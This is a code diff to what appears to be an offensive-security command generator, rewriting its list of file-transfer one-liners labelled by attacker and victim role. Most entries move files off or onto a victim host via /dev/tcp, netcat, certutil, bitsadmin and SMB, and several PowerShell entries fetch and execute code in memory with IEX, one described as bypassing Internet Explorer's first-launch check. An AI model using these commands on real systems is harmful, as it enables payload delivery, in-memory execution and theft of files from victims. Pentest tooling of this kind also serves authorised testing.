@@ -436,45 +436,146 @@ const Transfer = withCommandType(
     CommandType.Transfer,
     [
         {
-            "name": "Bash Upload",
-            "command": "bash -c 'echo -e \"POST / HTTP/0.9 $(<{fileName})\" > /dev/tcp/{ip}/{port}\n\nbash -c 'cat {fileName} > /dev/tcp/{ip}/{port}''",
+            "name": "Wget Linux Upload",
+            "command": "python -m http.server {port} # Attacker\n\nwget http://{ip}:{port}/{fileName} # Victim",
             "meta": ["linux", "upload"]
         },
-        {
-            "name": "Bash Download",
-            "command": "nc -l -p {port} < {fileName}\n\nbash -c 'cat < /dev/tcp/{ip}/{port} > {fileName}'",
+		{
+            "name": "Curl Linux Upload",
+            "command": "python -m http.server {port} # Attacker\n\ncurl -o {fileName} http://{ip}:{port}/{fileName} # Victim",
+            "meta": ["linux", "upload"]
+        },
+		{
+            "name": "SCP Linux Upload",
+            "command": "scp {fileName} [USER]@{ip}:/home/[USER]/Desktop # Attacker",
+            "meta": ["linux", "upload"]
+        },
+		{
+            "name": "Bash #1 Linux Upload",
+            "command": "bash -c 'cat {fileName} > /dev/tcp/{ip}/{port}' # Attacker\n\nnc -lp {port} > {fileName} # Victim",
+            "meta": ["linux", "upload"]
+        },
+		{
+            "name": "Bash #2 Linux Upload",
+            "command": "bash -c 'echo -e \"POST / HTTP/0.9 $(<{fileName})\" > /dev/tcp/{ip}/{port}' # Attacker",
+            "meta": ["linux", "upload"]
+        },
+		{
+            "name": "Netcat Linux Upload",
+            "command": "nc -lvp {port} > {fileName} # Attacker\n\nnc {ip} {port} -w 3 < {fileName} # Victim",
+            "meta": ["linux", "upload"]
+        },
+		{
+            "name": "FTP Linux Upload",
+            "command": "twistd -n ftp -r . # Attacker\n\nwget ftp://{ip}:{port}/{fileName} # Victim",
+            "meta": ["linux", "upload"]
+        },
+		{
+            "name": "Base64 Linux Upload",
+            "command": "cat {fileName} | base64 -w 0; echo # Attacker\n\necho [BASE64_OUTPUT] | base64 -d > {fileName} # Victim",
+            "meta": ["linux", "upload"]
+        },
+		{
+            "name": "Wget Linux Download",
+            "command": "python -m http.server {port} # Victim\n\nwget http://{ip}:{port}/{fileName} # Attacker",
             "meta": ["linux", "download"]
         },
-        {
-            "name": "Netcat Upload",
-            "command": "nc -lnvp ; {port}nc {ip} {port} < {fileName}",
-            "meta": ["linux", "upload"]
-        },
-        {
-            "name": "Netcat Download",
-            "command": "nc {ip} {port} < {fileName}\n\nnc -lnvp {port} > {fileName}",
+		{
+            "name": "Netcat Linux Download",
+            "command": "nc -lvp {port} > {fileName} # Victim \n\nnc {ip} {port} -w 3 < {fileName} # Attacker",
             "meta": ["linux", "download"]
         },
-        {
-            "name": "Python3 HTTP Server",
-            "command": "python3 -m http.server {port}",
-            "meta": ["linux", "upload"]
+		{
+            "name": "SCP Linux Download",
+            "command": "scp [USER]@{ip}:/home/[USER]/Desktop/{fileName} . # Attacker",
+            "meta": ["linux", "download"]
         },
-        {
-            "name": "Python2 HTTP Server",
-            "command": "python -m SimpleHTTPServer {port}",
-            "meta": ["linux", "upload"]
+		{
+            "name": "Bash Linux Download",
+            "command": "nc -lp {port} < {fileName} # Attacker \n\nbash -c 'cat < /dev/tcp/{ip}/{port} > {fileName}' # Victim",
+            "meta": ["linux", "download"]
         },
-        {
-            "name": "SCP Upload from local host to remote computer",
-            "command": "scp dasdsa username@{ip}:~/{fileName} -P {port}",
-            "meta": ["linux", "upload"]
+		{
+            "name": "Base64 Linux Download",
+            "command": "echo [BASE64_OUTPUT] | base64 -d > {fileName} # Victim\n\ncat {fileName} | base64 -w 0; echo # Attacker",
+            "meta": ["linux", "download"]
         },
-        {
-            "name": "SCP Download from remote computer",
-            "command": "scp user@{ip}:~/{fileName} -P {port}",
-            "meta": ["linux", "windows", "download"]
+		{
+            "name": "Certutil Windows Upload",
+            "command": "python -m http.server {port} # Attacker\n\ncertutil.exe -urlcache -split -f http://{ip}:{port}/{fileName} {fileName} # Victim",
+            "meta": ["windows", "upload"]
         },
+		{
+            "name": "BitsAdmin Windows Upload",
+		"command": "python -m http.server {port} # Attacker\n\nbitsadmin /transfer n http://{ip}:{port}/{fileName} C:\Temp\{fileName} # Victim",
+            "meta": ["windows", "upload"]
+        },
+		
+		{
+            "name": "Powershell #1 Windows Upload",
+            "command": "python -m http.server {port} # Attacker\n\npowershell.exe -c \"(New-Object System.NET.WebClient).DownloadFile('http://{ip}:{port}/{fileName}','C:\Users\%USERNAME%\Desktop\{fileName}')\" # Victim",
+            "meta": ["windows", "upload"]
+        },
+		{
+            "name": "Powershell #2 Windows Upload",
+            "command": "#This payload download the file to the disk!\n\npython -m http.server {port} # Attacker\n\nInvoke-WebRequest http://{ip}:{port}/{fileName} -OutFile {fileName} # Victim",
+            "meta": ["windows", "upload"]
+        },
+		{
+            "name": "Powershell #3 Windows Upload",
+            "command": "#This payload download will execute the file on the memory!\n\npython -m http.server {port} # Attacker\n\nIEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/{fileName}') # Victim",
+            "meta": ["windows", "upload"]
+        },
+		{
+            "name": "Powershell #4 Windows Upload",
+            "command": "#This payload download will execute the file on the memory and bypass Internet Explorer first-launch configuration preventing the download!\n\npython -m http.server {port} # Attacker\n\nInvoke-WebRequest http://{ip}:{port}/{fileName} -UseBasicParsing | iex# Victim",
+            "meta": ["windows", "upload"]
+        },
+		{
+            "name": "SCP Windows Upload",
+            "command": "scp {fileName} [USER]@{ip}:/C:/Users/%USERNAME%/Desktop # Attacker\n\n",
+            "meta": ["windows", "upload"]
+        },
+		{
+            "name": "Netcat Windows Upload",
+            "command": "nc.exe -lvp {port} > {fileName} # Victim \n\nnc {ip} {port} -w 3 < {fileName} # Attacker",
+            "meta": ["windows", "upload"]
+        },
+		{
+            "name": "FTP Windows Upload",
+            "command": "twistd -n ftp -r . # Attacker\n\nftp\nopen {ip} {port}\nanonymous\nget {fileName}\nbye # Victim",
+            "meta": ["windows", "upload"]
+        },
+		{
+            "name": "SMB Windows Upload",
+            "command": "impacket-smbserver -smb2support test . # Attacker\n\ncopy \\{ip}:{port}\test\{fileName} {fileName} # Victim",
+            "meta": ["windows", "upload"]
+        },
+		{
+            "name": "Powercat Windows Download",
+            "command": "python -m http.server 8754 #Attacker (Serve Powercat File on port 8754)\n\npowershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}:8754/powercat.ps1');powercat -l -p {port} -i C:\Users\%USERNAME%\Desktop\{fileName}\" # Victim\n\nwget http://{ip}:{port}/{fileName} # Attacker",
+            "meta": ["windows", "download"]
+        },
+		{
+            "name": "SCP Windows Download",
+            "command": "scp [USER]@{ip}:/C:/Users/%USERNAME%/Desktop {fileName} # Attacker\n\n",
+            "meta": ["windows", "download"]
+        },
+		{
+            "name": "Netcat Windows Download",
+            "command": "nc -lvp {port} > {fileName} # Attacker \n\nnc.exe {ip} {port} -w 3 < {fileName} # Victim",
+            "meta": ["windows", "download"]
+        },
+		{
+            "name": "FTP Windows Download",
+            "command": "python -m pyftpdlib -w # Attacker\n\nftp\nopen {ip} {port}\nanonymous\nput {fileName}\nbye # Victim",
+            "meta": ["windows", "download"]
+        },
+		{
+            "name": "SMB Windows Download",
+            "command": "impacket-smbserver -smb2support test . # Attacker\n\ncopy {fileName} \\{ip}:{port}\test\{fileName} # Victim",   
+            "meta": ["windows", "download"]
+        },		
 
     ]
 )
